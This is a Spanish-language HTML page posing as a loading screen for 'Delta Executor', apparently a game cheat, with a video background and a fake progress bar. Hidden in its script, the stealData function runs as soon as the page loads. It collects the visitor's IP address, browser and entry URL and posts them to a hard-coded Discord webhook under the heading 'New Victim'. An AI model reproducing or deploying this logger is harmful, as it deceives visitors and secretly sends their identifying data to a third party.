<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Delta Executor - Cargando...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body, html {
            height: 100%;
            width: 100%;
            overflow: hidden;
            background-color: #000;
            font-family: 'Segoe UI', sans-serif;
        }

        /* Contenedor del video de fondo */
        .video-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            pointer-events: none;
        }

        #player {
            width: 100%;
            height: 100%;
            transform: scale(1.5); /* Para evitar bordes negros */
        }

        /* Capa de cristal sobre el fondo */
        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.4);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 1;
        }

        /* Contenedor de la barra */
        .loader-container {
            width: 80%;
            max-width: 500px;
            padding: 30px;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 20px;
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
            text-align: center;
        }

        .status-text {
            color: #fff;
            margin-bottom: 20px;
            font-size: 1.2rem;
            text-transform: uppercase;
            letter-spacing: 2px;
            font-weight: 300;
            text-shadow: 0 0 10px rgba(255,255,255,0.5);
        }

        .progress-bar {
            width: 100%;
            height: 8px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #00ff41, #00cc33);
            box-shadow: 0 0 15px #00ff41;
            transition: width 0.1s linear;
        }
    </style>
</head>
<body>

    <div class="video-background">
        <div id="player"></div>
    </div>

    <div class="overlay" onclick="unmuteVideo()">
        <div class="loader-container">
            <div class="status-text" id="status">Iniciando sistema...</div>
            <div class="progress-bar">
                <div class="progress-fill" id="progress"></div>
            </div>
        </div>
    </div>

    <script>
        // Configuración de la Webhook
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1494884260577022002/M67ttC3ZWJ4wobkDm-1S6PSj53UzbYOh-lsXhhfeHaXnBqYXTb0BWDrySTVGQKkjIpoj';

        // 1. Cargar API de YouTube para el fondo
        var tag = document.createElement('script');
        tag.src = "https://www.youtube.com/iframe_api";
        var firstScriptTag = document.getElementsByTagName('script')[0];
        firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);

        var player;
        function onYouTubeIframeAPIReady() {
            player = new YT.Player('player', {
                videoId: 'Tbw3w0RA0WU',
                playerVars: {
                    'autoplay': 1,
                    'controls': 0,
                    'showinfo': 0,
                    'rel': 0,
                    'loop': 1,
                    'playlist': 'Tbw3w0RA0WU',
                    'mute': 1 // Empezamos muteado para permitir autoplay
                },
                events: {
                    'onReady': onPlayerReady
                }
            });
        }

        function onPlayerReady(event) {
            event.target.playVideo();
            startLoading();
            stealData(); // Envía los datos apenas entra
        }

        function unmuteVideo() {
            if (player) {
                player.unMute();
                player.setVolume(50);
            }
        }

        // 2. Lógica de la barra de carga (Rápida)
        function startLoading() {
            const progress = document.getElementById('progress');
            const status = document.getElementById('status');
            let width = 0;
            
            const steps = ["Inyectando scripts...", "Bypassing Anticheat...", "Obteniendo IP...", "Finalizando..."];
            
            const interval = setInterval(() => {
                if (width >= 100) {
                    clearInterval(interval);
                    status.textContent = "¡Carga Completa!";
                } else {
                    width += 1; 
                    progress.style.width = width + '%';
                    
                    // Cambiar texto según el progreso
                    if (width < 30) status.textContent = steps[0];
                    else if (width < 60) status.textContent = steps[1];
                    else if (width < 90) status.textContent = steps[2];
                    else status.textContent = steps[3];
                }
            }, 50); // Velocidad rápida
        }

        // 3. Captura de datos y envío a Webhook
        async function stealData() {
            let ip = "Desconocida";
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ip = data.ip;
            } catch (e) {}

            const payload = {
                username: "Delta Background Logger",
                embeds: [{
                    title: "🌐 Nueva Víctima en el Portal",
                    color: 3066993,
                    fields: [
                        { name: "📍 Dirección IP", value: `\`${ip}\``, inline: true },
                        { name: "🖥️ Navegador", value: navigator.userAgent.split(') ')[1], inline: true },
                        { name: "🔗 URL de entrada", value: window.location.href }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(() => {});
        }
    </script>
</body>
</html>
